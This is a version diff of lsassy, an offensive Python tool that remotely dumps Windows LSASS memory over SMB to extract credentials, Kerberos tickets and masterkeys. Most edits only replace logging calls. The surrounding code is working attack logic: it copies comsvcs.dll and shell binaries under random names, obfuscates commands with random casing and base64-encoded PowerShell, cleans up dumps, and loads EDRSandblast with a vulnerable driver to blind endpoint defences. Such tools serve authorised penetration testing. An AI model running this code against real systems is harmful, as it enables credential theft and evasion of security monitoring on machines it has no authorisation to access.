+│ │ -        elif self.arguments.v >= 2:
+│ │ -            logging.getLogger().setLevel(logging.DEBUG)
+│ │ -            threading.current_thread().name = "[DEBUG]"
+│ │ -            logging.info("lsassy v {}".format(__version__))
+│ │ -        else:
+│ │ -            logging.getLogger().setLevel(logging.ERROR)
+│ │ -
+│ │ -        threading.current_thread().name = "[Core]"
+│ │          try:
+│ │              # Turn-on the worker threads
+│ │              for i in range(self.max_threads):
+│ │                  thread = Worker(self.task_q)
+│ │                  thread.daemon = True
+│ │                  self.threads.append(thread)
+│ │                  thread.start()
+│ │  
+│ │              instance_id = 1
+│ │ +            lsassy_logger.debug(f"Targets: {self.targets}")
+│ │              for target in self.targets:
+│ │                  self.task_q.put(Lsassy(target, self.arguments, instance_id))
+│ │ +                lsassy_logger.debug(f"Created target: {instance_id}: {target}")
+│ │                  instance_id += 1
+│ │  
+│ │              # Block until all tasks are done
+│ │              self.task_q.join()
+│ │ -
+│ │          except KeyboardInterrupt as e:
+│ │ -            logging.error("Au revoir.")
+│ │ +            lsassy_logger.error("Au revoir.")
+│ │  
+│ │  
+│ │  class Lsassy:
+│ │      """
+│ │      Main class to extract credentials from one remote host. Can be used in different threads for parallelization
+│ │      """
+│ │  
+│ │ @@ -130,27 +122,27 @@
+│ │  
+│ │          # Dump path checks
+│ │          dump_path = self.args.dump_path
+│ │          if dump_path:
+│ │              dump_path = dump_path.replace('/', '\\')
+│ │              if len(dump_path) > 1 and dump_path[1] == ":":
+│ │                  if dump_path[0] != "C":
+│ │ -                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+│ │ +                    lsassy_logger.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+│ │                      return False
+│ │                  dump_path = dump_path[2:]
+│ │              if dump_path[-1] != "\\":
+│ │                  dump_path += "\\"
+│ │  
+│ │          parse_only = self.args.parse_only
+│ │          keep_dump = self.args.keep_dump
+│ │          kerberos_dir = self.args.kerberos_dir
+│ │          masterkeys_file = self.args.masterkeys_file
+│ │  
+│ │          if parse_only and (dump_path is None or self.args.dump_name is None):
+│ │ -            logging.error("--dump-path and --dump-name required for --parse-only option")
+│ │ +            lsassy_logger.error("--dump-path and --dump-name required for --parse-only option")
+│ │              return False
+│ │  
+│ │          try:
+│ │              session = Session()
+│ │              session.get_session(
+│ │                  address=self.target,
+│ │                  target_ip=self.target,
+│ │ @@ -163,51 +155,51 @@
+│ │                  aesKey=self.args.aesKey,
+│ │                  dc_ip=self.args.dc_ip,
+│ │                  kerberos=self.args.kerberos,
+│ │                  timeout=self.args.timeout
+│ │              )
+│ │  
+│ │              if session.smb_session is None:
+│ │ -                logging.warning("Couldn't connect to remote host")
+│ │ +                lsassy_logger.warning("Couldn't connect to remote host")
+│ │                  return False
+│ │  
+│ │              if not parse_only:
+│ │                  dumper = Dumper(session, self.args.timeout, self.args.time_between_commands).load(self.args.dump_method)
+│ │                  if dumper is None:
+│ │ -                    logging.error("Unable to load dump module")
+│ │ +                    lsassy_logger.error("Unable to load dump module")
+│ │                      return False
+│ │  
+│ │                  file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
+│ │                                     copy=self.args.copy, dump_path=dump_path,
+│ │                                     dump_name=self.args.dump_name, **options)
+│ │                  if file is None:
+│ │ -                    logging.error("Unable to dump lsass.")
+│ │ +                    lsassy_logger.error("Unable to dump lsass.")
+│ │                      return False
+│ │              else:
+│ │                  file = ImpacketFile(session).open(
+│ │                      share="C$",
+│ │                      path=dump_path,
+│ │                      file=self.args.dump_name,
+│ │                      timeout=self.args.timeout
+│ │                  )
+│ │                  if file is None:
+│ │ -                    logging.error("Unable to open lsass dump.")
+│ │ +                    lsassy_logger.error("Unable to open lsass dump.")
+│ │                      return False
+│ │  
+│ │              credentials, tickets, masterkeys = Parser(file).parse()
+│ │              file.close()
+│ │  
+│ │              if not parse_only and not keep_dump:
+│ │                  ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
+│ │ -                logging.success("Lsass dump deleted")
+│ │ +                lsassy_logger.debug("Lsass dump deleted")
+│ │              else:
+│ │ -                logging.debug("Not deleting lsass dump as --parse-only was provided")
+│ │ +                lsassy_logger.debug("Not deleting lsass dump as --parse-only was provided")
+│ │  
+│ │              if credentials is None:
+│ │ -                logging.error("Unable to extract credentials from lsass. Cleaning.")
+│ │ +                lsassy_logger.error("Unable to extract credentials from lsass. Cleaning.")
+│ │                  return False
+│ │  
+│ │              with lock:
+│ │                  Writer(credentials, tickets, masterkeys).write(
+│ │                      self.args.file_format,
+│ │                      self.args.format,
+│ │                      output_file=self.args.outfile,
+│ │ @@ -218,42 +210,42 @@
+│ │                      kerberos_dir=kerberos_dir,
+│ │                      masterkeys_file=masterkeys_file
+│ │                  )
+│ │  
+│ │          except KeyboardInterrupt:
+│ │              pass
+│ │          except Exception as e:
+│ │ -            logging.error("An unknown error has occurred.", exc_info=True)
+│ │ +            lsassy_logger.error("An unknown error has occurred.", exc_info=True)
+│ │          finally:
+│ │ -            logging.debug("Cleaning...")
+│ │ -            logging.debug("dumper: {}".format(dumper))
+│ │ -            logging.debug("file: {}".format(file))
+│ │ -            logging.debug("session: {}".format(session))
+│ │ +            lsassy_logger.debug("Cleaning...")
+│ │ +            lsassy_logger.debug("dumper: {}".format(dumper))
+│ │ +            lsassy_logger.debug("file: {}".format(file))
+│ │ +            lsassy_logger.debug("session: {}".format(session))
+│ │              try:
+│ │                  dumper.clean()
+│ │ -                logging.debug("Dumper cleaned")
+│ │ +                lsassy_logger.debug("Dumper cleaned")
+│ │              except Exception as e:
+│ │ -                logging.debug("Potential issue while cleaning dumper: {}".format(str(e)))
+│ │ +                lsassy_logger.debug("Potential issue while cleaning dumper: {}".format(str(e)))
+│ │  
+│ │              try:
+│ │                  file.close()
+│ │ -                logging.debug("File closed")
+│ │ +                lsassy_logger.debug("File closed")
+│ │              except Exception as e:
+│ │ -                logging.debug("Potential issue while closing file: {}".format(str(e)))
+│ │ +                lsassy_logger.debug("Potential issue while closing file: {}".format(str(e)))
+│ │  
+│ │              if not parse_only and not keep_dump:
+│ │                  try:
+│ │                      if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
+│ │ -                        logging.debug("Lsass dump deleted")
+│ │ +                        lsassy_logger.debug("Lsass dump deleted")
+│ │                  except Exception as e:
+│ │                      try:
+│ │ -                        logging.debug("Couldn't delete lsass dump using file. Trying dump object...")
+│ │ +                        lsassy_logger.debug("Couldn't delete lsass dump using file. Trying dump object...")
+│ │                          if ImpacketFile.delete(session, file_path=dumper.dump_path + dumper.dump_name, timeout=self.args.timeout):
+│ │ -                            logging.debug("Lsass dump deleted")
+│ │ +                            lsassy_logger.debug("Lsass dump deleted")
+│ │                      except Exception as e:
+│ │ -                        logging.debug("Potential issue while deleting lsass dump: {}".format(str(e)))
+│ │ +                        lsassy_logger.debug("Potential issue while deleting lsass dump: {}".format(str(e)))
+│ │  
+│ │              try:
+│ │                  session.smb_session.close()
+│ │ -                logging.debug("SMB session closed")
+│ │ +                lsassy_logger.debug("SMB session closed")
+│ │              except Exception as e:
+│ │ -                logging.debug("Potential issue while closing SMB session: {}".format(str(e)))
+│ │ +                lsassy_logger.debug("Potential issue while closing SMB session: {}".format(str(e)))
+│ │   --- lsassy-3.1.6/lsassy/credential.py
+│ ├── +++ lsassy-3.1.7/lsassy/credential.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumper.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumper.py
+│ │┄ Files 6% similar despite different names
+│ │ @@ -1,40 +1,39 @@
+│ │ -import logging
+│ │  import importlib
+│ │  import pkgutil
+│ │  
+│ │  from lsassy import dumpmethod, exec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Dumper:
+│ │      """
+│ │      Loader class to handle dump methods.
+│ │  
+│ │      This class looks for provided dump module name in `dumpmethod` package and returns an instance of this dump method.
+│ │      Returns None if doesn't exist.
+│ │      """
+│ │      def __init__(self, session, timeout, time_between_commands):
+│ │ -
+│ │          self._session = session
+│ │          self._timeout = timeout
+│ │          self._time_between_commands = time_between_commands
+│ │  
+│ │      def load(self, dump_module):
+│ │          """
+│ │          Load provided dump module
+│ │          :param dump_module: class name of dump module in dumpmethod package
+│ │          :return: instance of dump module
+│ │          """
+│ │          try:
+│ │              return importlib.import_module("lsassy.dumpmethod.{}".format(dump_module.lower()), "DumpMethod").DumpMethod(self._session, self._timeout, self._time_between_commands)
+│ │          except ModuleNotFoundError:
+│ │ -            logging.warning("Dump module '{}' doesn't exist".format(dump_module))
+│ │ +            lsassy_logger.warning("Dump module '{}' doesn't exist".format(dump_module))
+│ │              return None
+│ │          except Exception:
+│ │ -            logging.warning("Unknown error while loading '{}'".format(dump_module), exc_info=True)
+│ │ +            lsassy_logger.warning("Unknown error while loading '{}'".format(dump_module), exc_info=True)
+│ │              return None
+│ │  
+│ │      @staticmethod
+│ │      def list_dump_methods():
+│ │          return [name for _, name, _ in pkgutil.iter_modules(dumpmethod.__path__)]
+│ │  
+│ │      @staticmethod
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/__init__.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/__init__.py
+│ │┄ Files 13% similar despite different names
+│ │ @@ -1,16 +1,16 @@
+│ │  import base64
+│ │  import importlib
+│ │ -import logging
+│ │  import os
+│ │  import random
+│ │  import string
+│ │  import time
+│ │  
+│ │  from lsassy.impacketfile import ImpacketFile
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class CustomBuffer:
+│ │      def __init__(self):
+│ │          self._buffer = b""
+│ │          self._currentOffset = 0
+│ │          self._total_read = 0
+│ │ @@ -33,62 +33,63 @@
+│ │          self.file = file
+│ │          self.path = False
+│ │          self.remote_share = "C$"
+│ │          self.remote_path = "\\Windows\\Temp\\"
+│ │          self.uploaded = False
+│ │          self.content = content
+│ │          self.share_mode = False
+│ │ +        
+│ │  
+│ │      def get_remote_path(self):
+│ │          return self.remote_path + self.file
+│ │  
+│ │      def init(self, options):
+│ │          if self.content is not None:
+│ │              return True
+│ │          
+│ │          self.path = options.get("{}_path".format(self.name), self.path)
+│ │  
+│ │          if not self.path:
+│ │ -            logging.error("Missing {}_path".format(self.name))
+│ │ +            lsassy_logger.error("Missing {}_path".format(self.name))
+│ │              return None
+│ │  
+│ │          if self.path.startswith('\\\\'):
+│ │              # Share provided
+│ │              self.remote_path = self.path
+│ │              self.file = ""
+│ │              self.share_mode = True
+│ │              return True
+│ │          if not os.path.exists(self.path):
+│ │ -            logging.error("{} does not exist.".format(self.path))
+│ │ +            lsassy_logger.error("{} does not exist.".format(self.path))
+│ │              return None
+│ │  
+│ │          return True
+│ │  
+│ │      def upload(self, session):
+│ │          # Upload dependency
+│ │  
+│ │          if self.share_mode:
+│ │              return True
+│ │  
+│ │          if self.content is None:
+│ │ -            logging.debug('Copy {} to {}'.format(self.path, self.remote_path))
+│ │ +            lsassy_logger.debug('Copy {} to {}'.format(self.path, self.remote_path))
+│ │              with open(self.path, 'rb') as p:
+│ │                  try:
+│ │                      session.smb_session.putFile(self.remote_share, self.remote_path + self.file, p.read)
+│ │ -                    logging.success("{} uploaded".format(self.name))
+│ │ +                    print("{} uploaded".format(self.name))
+│ │                      self.uploaded = True
+│ │                      return True
+│ │                  except Exception as e:
+│ │ -                    logging.error("{} upload error".format(self.name), exc_info=True)
+│ │ +                    lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
+│ │                      return None
+│ │          else:
+│ │              if not ImpacketFile.create_file(session, self.remote_share, self.remote_path, self.file, self.content):
+│ │ -                logging.error("{} upload error".format(self.name), exc_info=True)
+│ │ +                lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
+│ │                  return None
+│ │ -            logging.success("{} uploaded".format(self.name))
+│ │ +            print("{} uploaded".format(self.name))
+│ │              self.uploaded = True
+│ │              return True
+│ │  
+│ │      def clean(self, session, timeout):
+│ │          if self.uploaded:
+│ │              ImpacketFile.delete(session, self.remote_path + self.file, timeout=timeout)
+│ │  
+│ │ @@ -116,20 +117,21 @@
+│ │          self._file = ImpacketFile(self._session)
+│ │          self._file_handle = None
+│ │          self._executor_name = ""
+│ │          self._executor_path = ""
+│ │          self._executor_copied = False
+│ │          self._timeout = timeout
+│ │          self._time_between_commands = time_between_commands
+│ │ +        
+│ │  
+│ │      def get_exec_method(self, exec_method, no_powershell=False):
+│ │          try:
+│ │              exec_method = importlib.import_module("lsassy.exec.{}".format(exec_method.lower()), "Exec").Exec(self._session)
+│ │          except ModuleNotFoundError:
+│ │ -            logging.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
+│ │ +            lsassy_logger.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
+│ │              return None
+│ │  
+│ │          if not self.need_debug_privilege or exec_method.debug_privilege:
+│ │              return exec_method
+│ │  
+│ │          if no_powershell:
+│ │              return None
+│ │ @@ -168,156 +170,158 @@
+│ │          }
+│ │          if executor not in executor_locations:
+│ │              return None
+│ │  
+│ │          self._executor_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + "." + random.choice(IDumpMethod.ext)
+│ │          self._executor_path = "\\Windows\\Temp\\"
+│ │          try:
+│ │ -            logging.info("Opening {}".format(executor))
+│ │ +            lsassy_logger.info("Opening {}".format(executor))
+│ │              buff = CustomBuffer()
+│ │              self._session.smb_session.getFile("C$", executor_locations[executor], buff.write)
+│ │              self._session.smb_session.putFile("C$", self._executor_path + self._executor_name, buff.read)
+│ │ -            logging.success("{} copied as {}".format(executor, self._executor_name))
+│ │ +            print("{} copied as {}".format(executor, self._executor_name))
+│ │              self._executor_copied = True
+│ │              return True
+│ │          except Exception as e:
+│ │ -            logging.debug("An error occurred while copying {}".format(executor), exc_info=True)
+│ │ +            lsassy_logger.debug("An error occurred while copying {}".format(executor), exc_info=True)
+│ │              self._executor_path = ""
+│ │              self._executor_name = executor + ".exe"
+│ │              return None
+│ │  
+│ │      def executor_clean(self):
+│ │          if self._executor_copied:
+│ │              ImpacketFile.delete(self._session, self._executor_path + self._executor_name, timeout=self._timeout)
+│ │ -            logging.debug("Executor copy deleted")
+│ │ +            lsassy_logger.debug("Executor copy deleted")
+│ │  
+│ │      def build_exec_command(self, commands, exec_method, no_powershell=False, copy=False):
+│ │ -        logging.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
+│ │ +        lsassy_logger.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
+│ │          if commands["cmd"] is not None and (not self.need_debug_privilege or exec_method.debug_privilege):
+│ │              if not isinstance(commands["cmd"], list):
+│ │                  commands["cmd"] = [commands["cmd"]]
+│ │              self._executor_name = 'cmd.exe'
+│ │              if copy:
+│ │                  self.executor_copy('cmd')
+│ │ -            logging.debug(commands["cmd"])
+│ │ +            lsassy_logger.debug(commands["cmd"])
+│ │              executor_commands = ["""/Q /c {}""".format(command) for command in commands["cmd"]]
+│ │          elif commands["pwsh"] is not None and not no_powershell:
+│ │              if not isinstance(commands["pwsh"], list):
+│ │                  commands["pwsh"] = [commands["pwsh"]]
+│ │              self._executor_name = 'powershell.exe'
+│ │              if copy:
+│ │                  self.executor_copy('powershell')
+│ │ -            logging.debug(commands["pwsh"])
+│ │ +            lsassy_logger.debug(commands["pwsh"])
+│ │              executor_commands = ["-NoP -Enc {}".format(base64.b64encode(command.encode('UTF-16LE')).decode("utf-8")) for command in commands["pwsh"]]
+│ │          else:
+│ │ -            logging.error("Shouldn't fall here. Incompatible constraints")
+│ │ +            lsassy_logger.error("Shouldn't fall here. Incompatible constraints")
+│ │              return None
+│ │  
+│ │          self._executor_name = ''.join(random.choice([str.upper, str.lower])(c) for c in self._executor_name)
+│ │          return ["{}{} {}".format(self._executor_path, self._executor_name, command) for command in executor_commands]
+│ │  
+│ │      def dump(self, dump_path=None, dump_name=None, no_powershell=False, copy=False, exec_methods=None, **kwargs):
+│ │ -        logging.info("Dumping via {}".format(self.__module__))
+│ │ +        lsassy_logger.info("Dumping via {}".format(self.__module__))
+│ │          if exec_methods is not None:
+│ │              self.exec_methods = exec_methods
+│ │  
+│ │          if dump_name is not None:
+│ │              if not self.custom_dump_name_support:
+│ │ -                logging.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
+│ │ -                logging.warning("Dump file will be {}".format(self.dump_name))
+│ │ +                lsassy_logger.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
+│ │ +                lsassy_logger.warning("Dump file will be {}".format(self.dump_name))
+│ │              else:
+│ │                  self.dump_name = dump_name
+│ │          elif self.dump_name == "":
+│ │              ext = IDumpMethod.ext
+│ │              if not self.custom_dump_ext_support:
+│ │                  ext = [self.dump_ext]
+│ │              self.dump_name = "{}.{}".format(
+│ │                  ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(3,9))),
+│ │                  random.choice(ext))
+│ │  
+│ │          if dump_path is not None:
+│ │              if not self.custom_dump_path_support:
+│ │ -                logging.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
+│ │ -                logging.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
+│ │ +                lsassy_logger.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
+│ │ +                lsassy_logger.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
+│ │              else:
+│ │                  self.dump_path = dump_path
+│ │  
+│ │          valid_exec_methods = {}
+│ │          for e in self.exec_methods:
+│ │              exec_method = self.get_exec_method(e, no_powershell)
+│ │ -            if exec_method is not None:
+│ │ +            lsassy_logger.debug(f"Exec method: {exec_method}")
+│ │ +            if exec_method is not None and exec_method not in valid_exec_methods:
+│ │                  valid_exec_methods[e] = exec_method
+│ │              else:
+│ │ -                logging.debug("Exec method '{}' is not compatible".format(e))
+│ │ +                lsassy_logger.debug("Exec method '{}' is not compatible".format(e))
+│ │ +        lsassy_logger.debug(f"Exec Methods: {valid_exec_methods}")
+│ │  
+│ │          if len(valid_exec_methods) == 0:
+│ │ -            logging.error("Current dump constrains cannot be fulfilled")
+│ │ -            logging.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
+│ │ -            logging.debug("Exec methods: {}".format(self.exec_methods))
+│ │ -            logging.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
+│ │ +            lsassy_logger.error("Current dump constrains cannot be fulfilled")
+│ │ +            lsassy_logger.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
+│ │ +            lsassy_logger.debug("Exec methods: {}".format(self.exec_methods))
+│ │ +            lsassy_logger.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
+│ │              return None
+│ │  
+│ │          if self.prepare(kwargs) is None:
+│ │ -            logging.error("Module prerequisites could not be processed")
+│ │ +            lsassy_logger.error("Module prerequisites could not be processed")
+│ │              self.clean()
+│ │              return None
+│ │  
+│ │          try:
+│ │              commands = self.get_commands()
+│ │          except NotImplementedError:
+│ │ -            logging.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
+│ │ +            lsassy_logger.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
+│ │              return None
+│ │  
+│ │          if not isinstance(commands, dict) or "cmd" not in commands or "pwsh" not in commands:
+│ │ -            logging.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
+│ │ +            lsassy_logger.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
+│ │              return None
+│ │  
+│ │          for e, exec_method in valid_exec_methods.items():
+│ │ -            logging.info("Trying {} method".format(e))
+│ │ +            lsassy_logger.info("Trying {} method".format(e))
+│ │              exec_commands = self.build_exec_command(commands, exec_method, no_powershell, copy)
+│ │              if exec_commands is None:
+│ │                  # Shouldn't fall there, but if we do, just skip to next execution method
+│ │                  continue
+│ │              try:
+│ │                  first_execution = True
+│ │                  for exec_command in exec_commands:
+│ │                      if not first_execution:
+│ │                          time.sleep(self._time_between_commands)
+│ │                      first_execution = False
+│ │ -                    logging.debug("Transformed command: {}".format(exec_command))
+│ │ +                    lsassy_logger.debug("Transformed command: {}".format(exec_command))
+│ │                      res = exec_method.exec(exec_command)
+│ │                      self.executor_clean()
+│ │                  self.clean()
+│ │              except Exception:
+│ │ -                logging.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
+│ │ +                lsassy_logger.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
+│ │                  continue
+│ │              if not res:
+│ │ -                logging.error("Failed to dump lsass using {}".format(e))
+│ │ +                lsassy_logger.error("Failed to dump lsass using {}".format(e))
+│ │                  continue
+│ │              self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name, timeout=self._timeout)
+│ │              if self._file_handle is None:
+│ │ -                logging.error("Failed to dump lsass using {}".format(e))
+│ │ +                lsassy_logger.error("Failed to dump lsass using {}".format(e))
+│ │                  continue
+│ │ -            logging.success("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
+│ │ +            lsassy_logger.info("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
+│ │              return self._file_handle
+│ │              
+│ │ -        logging.error("All execution methods have failed")
+│ │ +        lsassy_logger.error("All execution methods have failed")
+│ │          self.clean()
+│ │          return None
+│ │  
+│ │      def failsafe(self, timeout=3):
+│ │          t = time.time()
+│ │          while True:
+│ │              if self._file_handle is not None:
+│ │                  self._file_handle.delete(timeout=timeout)
+│ │              else:
+│ │                  try:
+│ │                      self._session.smb_session.deleteFile(self.dump_share, self.dump_path + "/" + self.dump_name)
+│ │ -                    logging.debug("Lsass dump deleted")
+│ │ +                    lsassy_logger.debug("Lsass dump deleted")
+│ │                  except Exception as e:
+│ │                      if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
+│ │                          return True
+│ │                      if time.time() - t > timeout:
+│ │ -                        logging.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
+│ │ +                        lsassy_logger.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
+│ │                          return None
+│ │ -                    logging.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
+│ │ +                    lsassy_logger.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
+│ │                      time.sleep(0.5)
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/comsvcs.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/comsvcs.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/comsvcs_stealth.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/comsvcs_stealth.py
+│ │┄ Files 14% similar despite different names
+│ │ @@ -1,13 +1,13 @@
+│ │ -import logging
+│ │  import random
+│ │  import string
+│ │  
+│ │  from lsassy.dumpmethod import IDumpMethod, CustomBuffer
+│ │  from lsassy.impacketfile import ImpacketFile
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class DumpMethod(IDumpMethod):
+│ │  
+│ │      need_debug_privilege = True
+│ │  
+│ │      def __init__(self, session, timeout, time_between_commands):
+│ │ @@ -16,15 +16,16 @@
+│ │          # If default, set to 7. Otherwise, keep custom time
+│ │          if self._time_between_commands == 1:
+│ │              self._time_between_commands = 7
+│ │  
+│ │          self.comsvcs_copied = False
+│ │          self.comsvcs_copy_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dll"
+│ │          self.comsvcs_copy_path = "\\Windows\\Temp\\"
+│ │ -        logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))
+│ │ +        
+│ │ +        lsassy_logger.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))
+│ │  
+│ │      def random_case(self, s):
+│ │          return ''.join(c.upper() if random.getrandbits(1) == 1 else c.lower() for c in s)
+│ │  
+│ │      def get_commands(self):
+│ │          tasklist = self.random_case("tasklist")
+│ │          lsass = self.random_case("lsass")
+│ │ @@ -47,19 +48,19 @@
+│ │          return {
+│ │              "cmd": cmd_command,
+│ │              "pwsh": pwsh_command
+│ │          }
+│ │  
+│ │      def prepare(self, options):
+│ │          try:
+│ │ -            logging.info("Opening comsvcs.dll")
+│ │ +            lsassy_logger.info("Opening comsvcs.dll")
+│ │              buff = CustomBuffer()
+│ │              self._session.smb_session.getFile("C$", "\\Windows\\System32\\comsvcs.dll", buff.write)
+│ │              self._session.smb_session.putFile("C$", self.comsvcs_copy_path + self.comsvcs_copy_name, buff.read)
+│ │ -            logging.success("Comsvcs.dll copied")
+│ │ +            lsassy_logger.info("Comsvcs.dll copied")
+│ │              self.comsvcs_copied = True
+│ │              return True
+│ │          except Exception as e:
+│ │              print(e)
+│ │              return None
+│ │  
+│ │      def clean(self):
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/dllinject.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/dllinject.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/dumpert.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/dumpert.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/dumpertdll.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/dumpertdll.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/edrsandblast.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/edrsandblast.py
+│ │┄ Files 1% similar despite different names
+│ │ @@ -1,50 +1,50 @@
+│ │  """
+│ │  https://github.com/wavestone-cdt/EDRSandblast
+│ │  """
+│ │ -
+│ │ -import logging
+│ │  import os
+│ │  import random
+│ │  import string
+│ │  import subprocess
+│ │  
+│ │  from lsassy.dumpmethod import IDumpMethod, Dependency
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class DumpMethod(IDumpMethod):
+│ │      def __init__(self, session, timeout, time_between_commands):
+│ │          super().__init__(session, timeout, time_between_commands)
+│ │          self.edrsandblast = Dependency("edrsandblast", "EDRSandBlast.exe")
+│ │          self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
+│ │          self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")
+│ │  
+│ │          self.tmp_ntoskrnl = "lsassy_" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) + ".exe"
+│ │ +        
+│ │  
+│ │      def prepare(self, options):
+│ │          if os.name == 'nt':
+│ │              tmp_dir = 'C:\\Windows\\Temp\\'
+│ │          else:
+│ │              tmp_dir = '/tmp/'
+│ │          with open('{}{}'.format(tmp_dir, self.tmp_ntoskrnl), 'wb') as p:
+│ │              try:
+│ │                  self._session.smb_session.getFile("C$", "\\Windows\\System32\\ntoskrnl.exe", p.write)
+│ │ -                logging.success("ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl))
+│ │ +                lsassy_logger.info("ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl))
+│ │              except Exception as e:
+│ │ -                logging.error("ntoskrnl.exe download error", exc_info=True)
+│ │ +                lsassy_logger.error("ntoskrnl.exe download error", exc_info=True)
+│ │                  try:
+│ │                      os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
+│ │                  except Exception as e:
+│ │                      return None
+│ │                  return None
+│ │          self.ntoskrnl.content = self.get_offsets("{}{}".format(tmp_dir, self.tmp_ntoskrnl))
+│ │  
+│ │          if self.ntoskrnl.content is not None:
+│ │ -            logging.success("ntoskrnl offsets extracted")
+│ │ -            logging.debug(self.ntoskrnl.content.split("\n")[1])
+│ │ +            lsassy_logger.info("ntoskrnl offsets extracted")
+│ │ +            lsassy_logger.debug(self.ntoskrnl.content.split("\n")[1])
+│ │          os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
+│ │  
+│ │          return self.prepare_dependencies(options, [self.edrsandblast, self.RTCore64, self.ntoskrnl])
+│ │  
+│ │      def clean(self):
+│ │          self.clean_dependencies([self.edrsandblast, self.RTCore64, self.ntoskrnl])
+│ │  
+│ │ @@ -516,15 +516,15 @@
+│ │              "ntoskrnl_22000-348.exe": ["cf5e00", "cf6200", "cf6000", "87a", "c15d40", "20", "60"],
+│ │              "ntoskrnl_14393-4770.exe": ["339e60", "339c60", "339a60", "6ca", "0", "20", "50"],
+│ │              "ntoskrnl_19041-1348.exe": ["cec4e0", "cec2e0", "cec0e0", "87a", "c197c0", "20", "60"]
+│ │          }
+│ │          try:
+│ │              full_version = self.get_file_version(input_file)
+│ │              if not full_version:
+│ │ -                logging.error(f'[!] ERROR : failed to extract version from {input_file}.')
+│ │ +                lsassy_logger.error(f'[!] ERROR : failed to extract version from {input_file}.')
+│ │                  return None
+│ │  
+│ │              # Checks if the image version is already present in the CSV
+│ │              imageVersion = f'ntoskrnl_{full_version[2]}-{full_version[3]}.exe'
+│ │  
+│ │              if imageVersion in known_offsets:
